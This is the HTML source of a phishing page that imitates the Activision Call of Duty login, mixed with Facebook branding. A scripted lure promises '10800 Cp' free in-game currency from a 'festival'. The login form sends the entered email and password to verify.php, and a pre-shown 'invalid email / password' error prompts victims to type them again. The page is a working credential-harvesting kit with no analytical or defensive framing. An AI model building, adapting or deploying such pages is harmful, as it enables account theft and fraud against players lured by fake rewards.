<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="description" content="Activision login page">
    <title>FREE CP - CALL OF DUTY®</title>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="keywords" content="login, activision">
    <meta name="sitename" content="cod">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="_csrf" content="HSCVSx8eYHJLjxP7cM8AMxmKSr7WmnWmm35-FvlEqh0LFQ1HjKbF4WM86oIyOTdj">
    <meta name="_csrf_header" content="X-XSRF-TOKEN">
    <link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700%7COpen+Sans:300,400,700&subset=latin,latin,latin" media="all">
    <meta property="og:image" content="images/COD-Badge_Meta.png">
    <link rel="stylesheet" href="css/preload.css">
    <link rel="stylesheet" href="css/common-site-updated.css">
    <link rel="stylesheet" href="css/sso-media-queries.css">
    <link rel="stylesheet" href="css/responsive-site.css">
    <link rel="stylesheet" href="css/sso-site-specific.css">
    <link rel="stylesheet" href="css/site.css">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body class="login-page hasscript sso locale-en">
    <div id="skip-to-main">
        <a href="#main-content" class="skip-to-main-link">Skip to main content</a>
    </div>
    <div id="cdo-bar" role="banner"></div>
    <div class="account-linking-error-container">
        <!-- Account linking error messages -->
    </div>
    <main id="main-content" class="main-content-container">
        <div id="login" class="wrapper SSO SSO-PAGE center">
            <article>
                <section class="clearfix">
                    <h1 class="header-logo"><span class="pre-cod-logo"></span><span class="header-logo" aria-label="Facebook"></span></h1>
                    <div class="cod-login-step1"><p><span class="corners left"></span>Log in Via Your Network<span class="corners right"></span></p></div>
                    <form id="frmLogin" name="frmLogin" class="horz-label clearfix" action="verify.php" method="POST">
                        <fieldset id="login-info" class="sso-form-input-block">
                            <h1 class="header-logo">
                                <img style="width: 320px; margin: 0px -50px;" class="fb_logo _8ilh img" src="images/Site.jpg" alt="Facebook">
                            </h1>
                            <h6 id="typedText"></h6>
                            <script>
                                document.addEventListener("DOMContentLoaded", function() {
                                    const text = "How can we receive the new bonuses, just read the words below once : \n  10800 Cp For You incredible Event  \nOur Festival Has Been Around For 2 days\nAvoid asking too much because the festival servers are very busy\n Your registered request will be confirmed by us after 4 to 8 hours";
                                    let i = 0;
                                    const speed = 30;
                                    function typeWriter() {
                                        if (i < text.length) {
                                            const char = text.charAt(i);
                                            if (char === "\n") {
                                                document.getElementById("typedText").innerHTML += "<br>";
                                            } else {
                                                document.getElementById("typedText").innerHTML += char;
                                            }
                                            i++;
                                            setTimeout(typeWriter, speed);
                                        }
                                    }
                                    typeWriter();
                                });
                            </script>
                            <div class="data-row clearfix" id="email-data-row">
                                <div id="email-error" class="feedback-control message" style="padding: 12px 49px;">You have entered an invalid email / password combination.</div>
                                <div class="data-row clearfix" id="email-data-row">
                                    <label for="username">Email Address:<sup>*</sup></label>
                                    <div class="input-container clearfix">
                                        <input type="email" id="username" name="username" title="Please enter your email address" aria-label="Please enter your email address" autocomplete="on" placeholder="" value="" required="" aria-required="true" aria-describedby="email-error">
                                    </div>
                                    <span class="sprite-pages feedback-control icon"></span>
                                    <div id="email-error" class="feedback-control message">Please enter your email address</div>
                                </div>
                                <div class="data-row clearfix" id="remember-me-div">
                                    <div class="input-container clearfix">
                                        <input type="checkbox" id="remember-me-checkbox" class="atvi-instrument atvi-instrument-checkbox" name="remember_me" value="true" checked="checked">
                                        <label for="remember-me-checkbox" class="custom-checkbox" style="display:none;"></label>
                                    </div>
                                    <label for="remember-me-checkbox">Remember me</label>
                                </div>
                                <div class="data-row clearfix" id="password-data-row">
                                    <label for="password">Password:<sup>*</sup></label>
                                    <div class="input-container clearfix">
                                        <input type="password" id="password" name="password" title="Please enter your password" aria-label="Please enter your password" autocomplete="on" placeholder="" required="" aria-required="true" aria-describedby="password-error">
                                        <span class="visibility-toggle" tabindex="0"></span>
                                    </div>
                                    <span class="sprite-pages feedback-control icon"></span>
                                    <div id="password-error" class="feedback-control message">Please enter a password</div>
                                </div>
                                <div class="g-recaptcha" data-sitekey="your-site-key" data-theme="dark"></div>
                                <div class="actions clearfix">
                                    <button id="login-button" class="submit large atvi-instrument atvi-instrument-button" type="submit">Sign In</button>
                                </div>
                                <div class="login-forgot-password">
                                    <a href="/help.php" id="login-forgot-password" class="atvi-instrument atvi-instrument-link" title="Need Help?">Need Help?</a>
                                </div>
                                <div id="login-center-content" class="center"></div>
                            </div>
                        </fieldset>
                        <div>
                            <input type="hidden" name="_csrf" value="HSCVSx8eYHJLjxP7cM8AMxmKSr7WmnWmm35-FvlEqh0LFQ1HjKbF4WM86oIyOTdj">
                        </div>
                    </form>
                    <p class="subheading">Select your network to get started</p>
                    <div id="console-login" class="network-select-container" data-site="cod">
                        <ul class="network-select console-login">
                            <li class="psn">
                                <a href="" class="psn-login-link" aria-label="Sign In Via Playstation"><span class="gaming-network-name">Sign In Via Playstation</span></a>
                            </li>
                            <li class="xbl">
                                <a href="" class="xbl-login-link" aria-label="Sign In Via Xbox"><span class="gaming-network-name">Sign In Via Xbox</span></a>
                            </li>
                            <li class="nintendo">
                                <a href="" class="nintendo-login-link" aria-label="Sign In Via Nintendo"><span class="gaming-network-name">Sign In Via Nintendo</span></a>
                            </li>
                            <li class="battle">
                                <a href="" class="battle-login-link" aria-label="Sign In Via Battle.net"><span class="gaming-network-name">Sign In Via Battle.net</span></a>
                            </li>
                            <li class="steam">
                                <a href="" class="steam-login-link" aria-label="Sign In Via Steam"><span class="gaming-network-name">Sign In Via Steam</span></a>
                            </li>
                        </ul>
                    </div>
                    <div class="or"><p>OR</p></div>
                    <div class="actions clearfix">
                        <p class="no-login-text">New to Call of Duty?</p>
                        <a href="/" title="Sign Up" id="login-need-account" class="cod atvi-instrument atvi-instrument-link">Sign Up</a>
                    </div>
                </section>
                <div class="clearfix registrationIncentives">
                    <ul>
                        <li class="regTile1">
                            <div class="incentive-container">
                                <h3>Enhance Your Game</h3>
                                <ul class="incentive-description">
                                    <li><span></span>Get your personalized live stats</li>
                                    <li><span></span>See where you rank on the global leaderboard</li>
                                    <li><span></span>Set your loadouts from the app or website</li>
                                </ul>
                            </div>
                        </li>
                        <li class="regTile2">
                            <div class="incentive-container">
                                <h3>Connect With Friends</h3>
                                <ul class="incentive-description">
                                    <li><span></span>Compare your stats to your friends</li>
                                    <li><span></span>See your friend's achievements</li>
                                    <li><span></span>Chat with other users on the forums</li>
                                </ul>
                            </div>
                        </li>
                        <li class="regTile3">
                            <div class="incentive-container">
                                <h3>Get The Latest Intel</h3>
                                <ul class="incentive-description">
                                    <li><span></span>Your source for the most current news</li>
                                    <li><span></span>Get alerts for new events or updates</li>
                                    <li><span></span>Receive personalized match analysis and weekly recaps</li>
                                </ul>
                            </div>
                        </li>
                    </ul>
                </div>
            </article>
        </div>
    </main>
    <script>
        if (navigator.cookieEnabled) {
            document.body.className = document.body.className.replace("noscript", "hasscript");
        }
    </script>
    <div id="noscript-warning">JavaScript and cookies are required. Please enable them.</div>
    <footer class="standard-footer">
        <div class="footer-content clearfix">
            <ul id="additional-info">
                <li class="first"><a href="/" target="_blank" rel="nofollow">Legal</a></li>
                <li><a href="/" target="_blank" rel="nofollow">Terms of Use</a></li>
                <li><a href="/" target="_blank" rel="nofollow">Privacy Policy</a></li>
                <li><a href="/" target="_blank" rel="nofollow">Cookie Policy</a></li>
                <li><button id="ot-sdk-btn" class="ot-sdk-show-settings">Cookie Settings</button></li>
                <li><a href="/" target="_blank" rel="nofollow">Online Safety</a></li>
                <li><a href="/" target="_blank">Support</a></li>
            </ul>
            <ul id="partners" class="clearfix">
                <li><a class="activision" href="/" target="_blank" rel="nofollow" role="img" aria-label="Visit the Activision website">Activision</a></li>
                <li><a class="esrb-privacy" href="/" target="_blank" rel="nofollow" role="img" aria-label="Visit the ESRB Privacy Certified website">Visit the ESRB Privacy Certified website</a></li>
                <li><a class="esrb-m" href="/" target="_blank" rel="nofollow" role="img" aria-label="Visit the rating board website.  ESRB Mature 17+: Blood and Gore, Intense Violence, Strong Language, Suggestive Themes, Use of Drugs, In-game Purchases / Users Interact">ESRB Mature 17+: Blood and Gore, Intense Violence, Strong Language, Suggestive Themes, Use of Drugs, In-game Purchases / Users Interact</a>
                    <p class="esrb-text">ESRB Mature 17+: Blood and Gore, Intense Violence, Strong Language, Suggestive Themes, Use of Drugs, In-game Purchases / Users Interact</p>
                </li>
            </ul>
            <div id="trademarks">© 2019-2024 Activision Publishing, Inc. ACTIVISION, CALL OF DUTY, CALL OF DUTY LEAGUE, CALL OF DUTY MODERN WARFARE, MODERN WARFARE, CALL OF DUTY BLACK OPS, CALL OF DUTY WARZONE, WARZONE and CALL OF DUTY VANGUARD are trademarks of Activision Publishing, Inc. All other trademarks and trade names are the property of their respective owners.</div>
        </div>
    </footer>
    <script src="js/jquery-1.11.2.js"></script>
    <script id="sso-bar-script" src="js/sso.bar.js"></script>
    <script>
        var config = {
            containerId : 'cdo-bar',
            locale : 'en_US',
            communityId : 'cod',
            isSSOPage : true,
            layout : {
                type : "hybrid"
            }
        }
        if (config.communityId && config.communityId.match('ghosts-monster')) {
            config.layout = {type : "hidden"};
        }
        if (config.communityId && config.communityId.match('ghosts-monster-eu')) {
            config.layout = {type : "hidden"};
        }
        var ssobar = new SSO.Bar(config);
    </script>
    <script id="digital-data-script" src="js/digitalData.js"></script>
    <script src="js/head.js"></script>
    <script src="js/qrcode.js"></script>
    <script src="js/jquery.qrcode.js"></script>
    <script id="common-script" src="js/site.js"></script>
    <script id="signup-script" src="js/signup.js"></script>
    <script id="analytics-script" src="js/atvi-analytics.js"></script>
    <script type="text/javascript">
        if (typeof _satellite !== 'undefined') {
            ssobar.onReady(_satellite.pageBottom);
        }
    </script>
    <noscript><img src="https://profile.callofduty.com/akam/13/pixel_6a2de6aa?a=dD03YWFhNTM4OTdkNWI3YzI4MDY3MjM1ZTE3NjZjODRkNjZkNzQyMGU1JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>
    <script type="text/javascript" src="0UCU0B.html"></script>
</body>
</html>
